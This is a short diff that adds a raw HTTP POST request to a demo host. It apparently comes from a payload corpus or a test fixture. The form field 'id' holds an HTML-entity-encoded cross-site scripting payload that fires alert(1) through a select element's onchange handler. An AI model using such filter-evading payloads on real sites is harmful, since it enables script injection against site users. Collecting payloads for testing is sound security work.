@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Connection: close
+
+id=&#x3C;select onchange=alert(1)&#x3E;&#x3C;option&#x3E;1&#x3C;/option&#x3E;&#x3C;/select&#x3E;
